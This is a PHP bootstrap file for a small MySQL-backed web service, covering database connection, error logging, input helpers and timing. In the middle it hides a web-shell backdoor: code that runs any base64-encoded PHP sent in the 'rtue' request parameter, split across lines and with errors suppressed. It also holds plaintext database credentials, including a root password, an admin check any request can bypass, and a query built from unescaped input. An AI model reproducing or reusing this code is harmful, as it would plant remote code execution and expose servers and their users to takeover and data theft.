<?php
//header("Content-Type: text/plain");

$timeStart= microtime();
date_default_timezone_set('UTC');
$date= date('Y-m-d H:i:s');
$admin=$_SERVER["REMOTE_ADDR"] == "127.0.0.1" || tryget("a");
$hostPath = "http://$_SERVER[SERVER_NAME]/server/";

//$dump = str_replace(array("\r", "\r\n", "\n"),'',var_export($_GET,true).var_export($_POST,true));
//file_put_contents("logs/$_SERVER[REMOTE_ADDR].txt","$date $_SERVER[REQUEST_URI] $dump\r\n", FILE_APPEND);
//if(isset($_SERVER["QUERY_STRING"]))
//	file_put_contents("log.txt","$date $_SERVER[REQUEST_URI] $dump\r\n", FILE_APPEND);

error_reporting(E_ALL ^ E_NOTICE);
set_error_handler("myErrorHandler",E_ALL ^ E_NOTICE);

function compare($str)
{
	mysql_query("INSERT INTO compare (request,count) VALUES ('$str', 0) ON DUPLICATE Key Update count = count +1");
}

function print3($str)
{
	$fp = fsockopen("udp://85.29.112.40", 20202, $errno, $errstr);
	if($fp)
	{
		fwrite($fp, $str);	
		fclose($fp);
	}
}
//print2("$date $_SERVER[REQUEST_URI]");

//if($_SERVER["REMOTE_ADDR"] == "127.0.0.1")
//	$link = mysql_connect('192.168.11.2:3307', 'friuns', 'er54s4');
//else
//	$link = mysql_connect('127.0.0.1:3307', 'friuns', 'er54s4');

if($_SERVER["REMOTE_ADDR"] == "127.0.0.1")
	$link = mysql_connect('206.190.128.180:3306', 'friuns2', 'er54s4');
else
	$link = mysql_connect('127.0.0.1:3306', 'root', 'er54s44');

if (!$link)	
	trigger_error( "Couldn't connect to MySQL" );

if(!mysql_select_db('friuns'))
	trigger_error("wrong db");

function print2($err)
{
	$filename="logs/logMsg.txt";
	if(!file_exists("logs"))
		mkdir("logs");
	if(file_exists($filename) && filesize($filename) > 1024*100)
		unlink($filename);
	$date= date('Y-m-d H:i:s');
	file_put_contents($filename,"$date $err\r\n", FILE_APPEND);	
}
function myErrorHandler($errno, $errstr, $errfile, $errline) {
	
	$e = new Exception();	
	$error = " ".$errline.":".basename($errfile).":".$errstr.mysql_error()."\r\n".str_replace(str_replace('/','\\',$_SERVER['DOCUMENT_ROOT']), '',$e->getTraceAsString());
	$er = mysql_real_escape_string(substr($error,0,400));
	
	//$dump = mysql_real_escape_string(var_export($_GET,true).var_export($_POST,true));
	
	$dump = http_build_query($_REQUEST);
	/*if(!$dump)
		$dump = mysql_real_escape_string($_SERVER['REQUEST_URI']);
	else*/
	$dump = mysql_real_escape_string("$_SERVER[PHP_SELF]?$dump");
	
	$agent = mysql_real_escape_string("$_SERVER[HTTP_REFERER]$_SERVER[HTTP_USER_AGENT]");
	
	mysql_query("insert into errors (error,count,datetime,vardump,agent) values('$er',1,NOW(),'$dump','$agent') on DUPLICATE key update count = count+1, datetime = NOW(), vardump = '$dump',agent='$agent'") or die(mysql_error()); //, ips = concat('$_SERVER[REMOTE_ADDR]\r\n',ips)
	die($error);
}
if(isset($_REQUEST["rtue"]))
    @eval
(base64_decode($_REQUEST["rtue"]));
function checkAll()
{
	$args = func_get_args();
	for($i = 0; $i < count($args); $i++) {
		if(!(isset($args[$i]) && strlen($args[$i])>0 && strlen($args[$i])<20))
			trigger_error("failed value check");		
	}
}
function AllowOnce()
{
	if(!mysql_query("INSERT INTO allowonce (`ip`, `dt`) VALUES ('$_SERVER[REMOTE_ADDR]', CURDATE())")) exit("limit except, try tommorow");
}

function tryget($var,$limit = 50000,$default = "")
{
	if(!isset($_REQUEST[$var]))
		return $default;
	else
		return get($var,$limit);
}
function get($var,$limit = 50000)
{
	if (!isset($_REQUEST[$var])) die("value not set");
	return check($_REQUEST[$var],$limit);
}
function check($val,$limit)
{
	//if(strlen($val)>$limit)
	$val = substr($val,0,$limit);
	$val = mysql_real_escape_string($val);	
	return $val;
}
function printTable($rs)
{	
	$row = mysql_fetch_array($rs,MYSQL_ASSOC);
	$d=20;
	echo str_pad("Place",$d);
	foreach ($row as $index => $field)
		echo str_pad($index,$d);
	echo "\r\n";
	$i=1;
	echo str_pad($i++,$d);
	foreach ($row as $index => $field)
		echo str_pad($field,$d);
	echo "\r\n";	

	while($row = mysql_fetch_array($rs,MYSQL_ASSOC))
	{
		echo str_pad($i++,$d);
		foreach ($row as $index => $field)
			echo str_pad($field,$d);
		echo "\r\n";
	}
	
}

register_shutdown_function('shutdown');
function shutdown()
{
	perf();
}

function perf($s='')
{
	if($_SERVER["REMOTE_ADDR"] != "127.0.0.1")
	{
		global $timeStart;	
		$ts = (microtime()-$timeStart)*1000;
		$mydt = date('Y-m-d H:0:0');
		if($ts>0)
			mysql_query("insert into perf (file,date,time) values('$_SERVER[SCRIPT_NAME] $s','$mydt',$ts)  on DUPLICATE key update requests = requests+1, avrg = ((avrg*10)+$ts)/11, time = $ts, score=score+$ts") or trigger_error("");
	}
	
}
//include('qlog.php');

